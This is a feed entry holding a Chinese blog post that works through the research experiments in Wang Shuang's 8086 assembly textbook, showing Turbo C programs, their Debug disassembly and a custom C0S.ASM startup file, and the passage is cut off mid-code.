      <category term="计算机系统" scheme="http://blog.codedragon.tech/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>王爽汇编语言第三版综合研究结论</title>
    <link href="http://blog.codedragon.tech/2017/03/10/%E7%8E%8B%E7%88%BD%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC%E4%B8%89%E7%89%88%E7%BB%BC%E5%90%88%E7%A0%94%E7%A9%B6%E7%BB%93%E8%AE%BA/"/>
    <id>http://blog.codedragon.tech/2017/03/10/王爽汇编语言第三版综合研究结论/</id>
    <published>2017-03-10T10:09:01.000Z</published>
    <updated>2017-03-16T14:25:07.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>开学三周，王爽的《汇编语言》（第三版）总算是基本上看完了，本文是总结的第三部分也是最后一部分（大概），主要是书后的综合研究</p>
</blockquote>
<h2 id="研究试验1-搭建一个精简的C语言开发环境"><a href="#研究试验1-搭建一个精简的C语言开发环境" class="headerlink" title="研究试验1 搭建一个精简的C语言开发环境"></a>研究试验1 搭建一个精简的C语言开发环境</h2><p>TC进行连接需要如下的文件：</p>
<ul>
<li>C0S.OBJ</li>
<li>CS.LIB</li>
<li>EMU.LIB</li>
<li>GRAPHICS.LIB</li>
<li>MATHS.LIB</li>
</ul>
<h2 id="研究试验2-使用寄存器"><a href="#研究试验2-使用寄存器" class="headerlink" title="研究试验2 使用寄存器"></a>研究试验2 使用寄存器</h2><ol>
<li>编一个程序ur1.c <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">main ()</div><div class="line">&#123;</div><div class="line">	_AX = <span class="number">1</span>;</div><div class="line">	_BX = <span class="number">1</span>;</div><div class="line">	_CX = <span class="number">2</span>;</div><div class="line">	_AX = _BX + _CX;</div><div class="line">	_AH = _BL + _CL;</div><div class="line">	_AL = _BH + _CH;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li>
<li>用Debug加载ur1.exe，用u命令查看ur1.exe编译后的机器码和汇编代码。<br> 思考：main函数的代码在什么段中？用Debug怎样找到ur1.exe中main函数的代码？<br> 回答：main函数的代码在CS段中，需要知道main函数的偏移地址才能找到main函数的代码。</li>
<li>用下面的方法打印出ur1.exe被加载运行时，main函数在代码段中的偏移地址。 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">main ()</div><div class="line">&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%x\n"</span>, main);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 思考：为什么这个程序能够打印出main函数在代码段中的偏移地址？<br> 回答：由学过的知识可知，C语言中用指针表示地址，这里的printf打印了main函数的入口地址，也即main函数在代码段中的偏移地址。</li>
<li><p>用Debug加载ur1.exe，根据上面打印出的main函数的偏移地址，用u命令察看main函数的汇编代码。仔细找到ur1.c中每条C语句对应的汇编代码。</p>
 <table><thead><tr><th style="text-align: center">地址</th><th style="text-align: center">汇编语句</th><th style="text-align: center">C语句</th></tr></thead><tbody><tr><td style="text-align: center">076A:01FA</td><td style="text-align: center">PUSH BP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:01FB</td><td style="text-align: center">MOV BP,SP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:01FD</td><td style="text-align: center">MOV AX,0001</td><td style="text-align: center">_AX = 1</td></tr><tr><td style="text-align: center">076A:0200</td><td style="text-align: center">MOV BX,0001</td><td style="text-align: center">_BX = 1</td></tr><tr><td style="text-align: center">076A:0203</td><td style="text-align: center">MOV CX,0002</td><td style="text-align: center">_CX = 2</td></tr><tr><td style="text-align: center">076A:0206</td><td style="text-align: center">MOV AX,BX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0208</td><td style="text-align: center">ADD AX,CX</td><td style="text-align: center">_AX = _BX + _CX</td></tr><tr><td style="text-align: center">076A:020A</td><td style="text-align: center">MOV AH,BL</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:020C</td><td style="text-align: center">ADD AH,CL</td><td style="text-align: center">_AH = _BL + _CL</td></tr><tr><td style="text-align: center">076A:020E</td><td style="text-align: center">MOV AL,BH</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0210</td><td style="text-align: center">ADD AL,CH</td><td style="text-align: center">_AL = _BH + _CH</td></tr><tr><td style="text-align: center">076A:0212</td><td style="text-align: center">POP BP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0213</td><td style="text-align: center">RET</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr></tbody></table>

<p> 注意：在这里，对于main函数汇编代码开始处的“push bp mov bp,sp”和结尾处的“pop bp”，这里只了解到：这是C编译器安排的为函数中可能使用到bp寄存器而设置的，就可以了。</p>
</li>
<li><p>通过main函数后面有ret指令，我们可以设想：C语言将函数实现为汇编语言中的子程序。研究下面程序的汇编代码，验证我们的设想。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"></div><div class="line">main()</div><div class="line">&#123;</div><div class="line">	_AX = <span class="number">1</span>; _BX = <span class="number">1</span>; _CX = <span class="number">2</span>;</div><div class="line"></div><div class="line">	f();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	_AX = _BX + _CX;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译、连接后用Debug查看汇编代码如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,<span class="number">0001</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BX</span>,<span class="number">0001</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">CX</span>,<span class="number">0002</span></div><div class="line"><span class="keyword">CALL</span> 020B</div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>,<span class="built_in">SP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>,<span class="built_in">BX</span></div><div class="line"><span class="keyword">ADD</span> <span class="built_in">AX</span>,<span class="built_in">CX</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure>
<p>设想正确</p>
</li>
</ol>
<h2 id="研究试验3-使用内存空间"><a href="#研究试验3-使用内存空间" class="headerlink" title="研究试验3 使用内存空间"></a>研究试验3 使用内存空间</h2><ol>
<li><p>编一个程序um1.c：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">main()</div><div class="line">&#123;</div><div class="line">	*(<span class="keyword">char</span> *)<span class="number">0x2000</span>=<span class="string">'a'</span>;</div><div class="line">	*(<span class="keyword">int</span> *)<span class="number">0x2000</span>=<span class="number">0xf</span>;</div><div class="line">	*(<span class="keyword">char</span> far *)<span class="number">0x20001000</span>=<span class="string">'a'</span>;</div><div class="line"></div><div class="line">	_AX=<span class="number">0x2000</span>;</div><div class="line">	*(<span class="keyword">char</span> *)_AX=<span class="string">'b'</span>;</div><div class="line"></div><div class="line">	_BX=<span class="number">0x1000</span>;</div><div class="line">	*(<span class="keyword">char</span> *)(_BX+_BX)=<span class="string">'a'</span>;</div><div class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0x20001000</span>+_BX)=*(<span class="keyword">char</span> *)_AX;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 把um1.c保存在C:\MINIC下，编译，连接生成um1.exe。然后用Debug加载um1.exe，对main函数的汇编代码进行分析，找到每条C语句对应的汇编代码；对main函数进行单步跟踪，察看相关内存单元的内容。</p>
 <table><thead><tr><th style="text-align: center">地址</th><th style="text-align: center">汇编语句</th><th style="text-align: center">C语句</th><th style="text-align: center">相关内存单元</th></tr></thead><tbody><tr><td style="text-align: center">076A:01FA</td><td style="text-align: center">PUSH BP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:01FB</td><td style="text-align: center">MOV BP,SP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:01FD</td><td style="text-align: center">MOV BYTE PTR [2000],61</td><td style="text-align: center">&#42;(char &#42;)0x2000=’a’</td><td style="text-align: center">07C4:2000 -&gt; 61</td></tr><tr><td style="text-align: center">076A:0202</td><td style="text-align: center">MOV WORD PTR [2000],000F</td><td style="text-align: center">&#42;(int &#42;)0x2000=0xf</td><td style="text-align: center">07C4:2000-07C4:2001 -&gt; 0F 00</td></tr><tr><td style="text-align: center">076A:0208</td><td style="text-align: center">MOV BX,2000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:020B</td><td style="text-align: center">MOV ES,BX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:020D</td><td style="text-align: center">MOV BX,1000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0210</td><td style="text-align: center">ES:</td><td style="text-align: center"></td><td style="text-align: center"></td></tr><tr><td style="text-align: center">076A:0211</td><td style="text-align: center">MOV BYTE PTR [BX],61</td><td style="text-align: center">&#42;(char far &#42;)0x20001000=’a’</td><td style="text-align: center">2000:1000 -&gt; 61</td></tr><tr><td style="text-align: center">076A:0214</td><td style="text-align: center">MOV AX,2000</td><td style="text-align: center">_AX=0x2000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0217</td><td style="text-align: center">MOV BX,AX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0219</td><td style="text-align: center">MOV BYTE PTR [BX],62</td><td style="text-align: center">&#42;(char &#42;)_AX=’b’</td><td style="text-align: center">07C4:2000 -&gt; 62</td></tr><tr><td style="text-align: center">076A:021C</td><td style="text-align: center">MOV BX,1000</td><td style="text-align: center">_BX=0x1000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:021F</td><td style="text-align: center">ADD BX,BX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0221</td><td style="text-align: center">MOV BYTE PTR [BX],61</td><td style="text-align: center">&#42;(char &#42;)(_BX + _BX)=’a’</td><td style="text-align: center">07C4:2000 -&gt; 61</td></tr><tr><td style="text-align: center">076A:0224</td><td style="text-align: center">MOV BX,AX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0226</td><td style="text-align: center">MOV AL,[BX]</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0228</td><td style="text-align: center">XOR CX,CX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:022A</td><td style="text-align: center">ADD BX,1000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:022E</td><td style="text-align: center">ADC CX,2000</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0232</td><td style="text-align: center">MOV ES,CX</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0234</td><td style="text-align: center">ES:</td><td style="text-align: center"></td><td style="text-align: center"></td></tr><tr><td style="text-align: center">076A:0235</td><td style="text-align: center">MOV [BX],AL</td><td style="text-align: center">&amp;#142(char far &#42;)(0x20001000+<em>BX)=&#42;(char &#42;)</em>AX</td><td style="text-align: center">2000:3000 -&gt; 61</td></tr><tr><td style="text-align: center">076A:0237</td><td style="text-align: center">POP BP</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr><tr><td style="text-align: center">076A:0238</td><td style="text-align: center">RET</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td><td style="text-align: center">&#95;&#95;&#95;&#95;</td></tr></tbody></table>
</li>
<li><p>编一个程序，用一条C语句实现在屏幕的中间显示一个绿色的字符”a”。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">main()</div><div class="line">&#123;</div><div class="line">	*(<span class="keyword">int</span> far *)<span class="number">0xb80007d0</span>=<span class="number">0x261</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>分析下面程序中所有函数的汇编代码，思考相关的问题。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> a1, a2, a3;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line">main()</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> b1, b2, b3;</div><div class="line">	a1 = <span class="number">0xa1</span>; a2 = <span class="number">0xa2</span>; a3 = <span class="number">0xa3</span>;</div><div class="line">	b1 = <span class="number">0xb1</span>; b2 = <span class="number">0xb2</span>; b3 = <span class="number">0xb3</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> c1, c2, c3;</div><div class="line">	a1 = <span class="number">0x0fa1</span>; a2 = <span class="number">0x0fa2</span>; a3 = <span class="number">0x0fa3</span>;</div><div class="line">	c1 = <span class="number">0xc1</span>; c2 = <span class="number">0xc2</span>; c3 = <span class="number">0xc3</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 问题：C语言将全局变量存放在哪里？将局部变量存放在哪里？每个函数开头的“push bp mov bp,sp”有何含义？<br> 程序中main函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>, <span class="built_in">SP</span></div><div class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="number">6</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01A6], 00A1</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01A8], 00A2</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01AA], 00A3</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">6</span>], 00B1</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">4</span>], 00B2</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">2</span>], 00B3</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>, <span class="built_in">BP</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure>
<p> 程序中f函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>, <span class="built_in">SP</span></div><div class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="number">6</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01A6], 0FA1</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01A8], 0FA2</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [01AA], 0FA3</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">6</span>], 00C1</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">4</span>], 00C2</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">BP</span>-<span class="number">2</span>], 00C3</div><div class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>, <span class="built_in">BP</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure>
<p> 答案：<br> C语言将全局变量存放在内存中，将局部变量存放在栈中，每个函数开头的push bp以及mov bp,sp是为了保护与还原现场。</p>
</li>
<li><p>分析下面程序的汇编代码，思考相关的问题。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> a,b,ab;</div><div class="line"></div><div class="line">main()</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> c;</div><div class="line">	c = f();</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	ab=a+b;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> ab;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 问题：C语言将函数的返回值存放在哪里？<br> 程序中main函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>, <span class="built_in">SP</span></div><div class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="number">2</span></div><div class="line"><span class="keyword">CALL</span> 020A</div><div class="line"><span class="keyword">MOV</span> [<span class="built_in">BP</span>-<span class="number">2</span>], <span class="built_in">AX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">SP</span>, <span class="built_in">BP</span></div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure>
<p> 程序中f函数的汇编代码如下：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">PUSH</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">BP</span>, <span class="built_in">SP</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>, [01A6]</div><div class="line"><span class="keyword">ADD</span> <span class="built_in">AX</span>, [01A8]</div><div class="line"><span class="keyword">MOV</span> [01AA], <span class="built_in">AX</span></div><div class="line"><span class="keyword">MOV</span> <span class="built_in">AX</span>, [01AA]</div><div class="line"><span class="keyword">JMP</span> 021C</div><div class="line"><span class="keyword">POP</span> <span class="built_in">BP</span></div><div class="line"><span class="keyword">RET</span></div></pre></td></tr></table></figure>
<p> 答案：<br> 在该情况下，C语言将返回值存放在通用寄存器AX中。</p>
</li>
<li><p>下面的程序向安全的内存空间写入从“a”到“h”8个字符，理解程序的含义，深入理解相关的知识。（注意：请自己学习、研究malloc函数的用法）</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> Buffer ((char *) * (int far *)0x02000000)</span></div><div class="line"></div><div class="line">main()</div><div class="line">&#123;</div><div class="line">	Buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">20</span>);</div><div class="line"></div><div class="line">	Buffer[<span class="number">10</span>] = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">while</span>(Buffer[<span class="number">10</span>]!=<span class="number">8</span>)</div><div class="line">	&#123;</div><div class="line">		Buffer[Buffer[<span class="number">10</span>]]=<span class="string">'a'</span>+Buffer[<span class="number">10</span>];</div><div class="line">		Buffer[<span class="number">10</span>]++;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 理解：<br> 程序通过malloc分配大小为20字节的空间给并将其地址存入Buffer所指向的空间即0200:0000中。随后，通过一个while循环将这20个字节的空间的0-7个字节分别赋予对应的字符，并且用第10个字节计数。</p>
</li>
</ol>
<h2 id="研究试验4-不用main函数编程"><a href="#研究试验4-不用main函数编程" class="headerlink" title="研究试验4 不用main函数编程"></a>研究试验4 不用main函数编程</h2><ol>
<li><p>把程序F.C保存在C:\MINIC下，对其进行编译，连接，思考相关的问题。<br> 问题：<br> ①编译和连接哪个环节会出问题？<br> ②显示出的错误信息是什么？<br> ③这个错误信息可能和哪个文件有关？<br> 答案：<br> ①连接环节出现了错误<br> ②在C0S模块中未定义的标号_main<br> ③和C0S.OBJ这个文件有关</p>
</li>
<li><p>用学习汇编语言时使用的LINK.EXE对TC.EXE生成的F.OBJ文件进行连接，生成F.EXE。用DEBUG加载F.EXE，察看整个程序的汇编代码。思考相关的问题。<br> 问题：<br> ①F.EXE的程序代码总共有多少字节？<br> ②F.EXE的程序能正确返回吗？<br> ③F函数的偏移地址是多少？<br> 答案：<br> ①F.EXE的程序代码总共有1DH个字节<br> ②F.EXE的程序不能正确的返回<br> ③F函数的偏移地址为0</p>
</li>
<li><p>写一个程序M.C。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">main ()</div><div class="line">&#123;</div><div class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">80</span>)=<span class="string">'a'</span>;</div><div class="line">	*(<span class="keyword">char</span> far *)(<span class="number">0xb8000000</span>+<span class="number">160</span>*<span class="number">10</span>+<span class="number">81</span>)=<span class="number">2</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 用TC.EXE对M.C进行编译，连接，生成M.EXE，用Debug察看M.EXE整个程序的汇编代码。思考相关的问题。<br> 问题：<br> (1)M.EXE的程序代码总共有多少字节？<br> (2)M.EXE的程序能正确返回吗？<br> (3)M.EXE程序中的main函数和F.EXE中的f函数的汇编代码有何不同？<br> 答案：<br> (1)M.EXE的程序代码总共有5F5H个字节<br> (2)M.EXE的程序能正确返回<br> (3)M.EXE程序中的main函数和F.EXE中的f函数的汇编代码没有不同</p>
</li>
<li><p>用Debug对m.exe进行跟踪：<br> (1)找到对main函数进行调用的指令的地址<br> (2)找到整个程序返回的指令<br> 注意：使用g命令和p命令。<br> 答案：<br> (1)对main函数进行调用的指令的地址为076A:011A CALL 01FA<br> (2)整个程序返回的指令为076A:0156 INT 21</p>
</li>
<li><p>思考如下几个问题：<br> (1)对main函数调用的指令和程序返回的指令是哪里来的？<br> (2)没有main函数时，出现的错误信息里有和“C0S”相关的信息；而前面在搭建开发环境时，没有C0S.OBJ文件TC.EXE就无法对程序进行连接。是不是TC.EXE把C0S.OBJ和用户程序的.OBJ一起进行连接生成.EXE文件？<br> (3)对用户程序的main函数进行调用的指令和程序返回的指令是否就来自C0S.OBJ文件？<br> (4)我们如何看到C0S.OBJ文件中的程序代码呢？<br> (5)C0S.OBJ文件里有我们设想的代码吗？<br> 回答：<br> (1)对main函数调用的指令和程序返回的指令是来自于其他的文件而非编译后的文件。<br> (2)是的<br> (3)是的<br> (4)用LINK.EXE对其进行连接即可<br> (5)有</p>
</li>
<li><p>用LINK.EXE对C:\MINIC目录下的C0S.OBJ进行连接，生成C0S.EXE。<br> 用Debug分别察看C0S.EXE和M.EXE的汇编代码。注意：从头开始察看，两个文件中的程序代码有和相同之处？<br> 两个程序的代码基本相同，且都是在011A调用了CALL指令，在0156调用了INT 21中断</p>
</li>
<li><p>用Debug找到M.EXE中调用main函数的CALL指令的偏移地址，从这个偏移地址开始向后察看10条指令；然后用Debug加载C0S.EXE，从相同的偏移地址开始向后察看10条指令，对两处的指令进行对比。<br> M.EXE和C0S.EXE在偏移地址011A之后的10条指令除了跳转指令的跳转地址有所不同外几乎完全相同。</p>
</li>
<li><p>下面，我们用汇编语言编一个程序C0S.ASM，然后把它编译为C0S.OBJ，替代C:\MINIC目录下的C0S.OBJ。<br> 程序C0S.ASM：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</div><div class="line">data <span class="meta">segment</span></div><div class="line">	<span class="built_in">db</span> <span class="number">128</span> dup (<span class="number">0</span>)</div><div class="line">data ends</div><div class="line"></div><div class="line">code <span class="meta">segment</span></div><div class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, data</div><div class="line">		<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></div><div class="line">		<span class="keyword">mov</span> <span class="built_in">ss</span>, <span class="built_in">ax</span></div><div class="line">		<span class="keyword">mov</span> <span class="built_in">sp</span>, <span class="number">108</span></div><div class="line"></div><div class="line">		<span class="keyword">call</span> s</div><div class="line"></div><div class="line">		<span 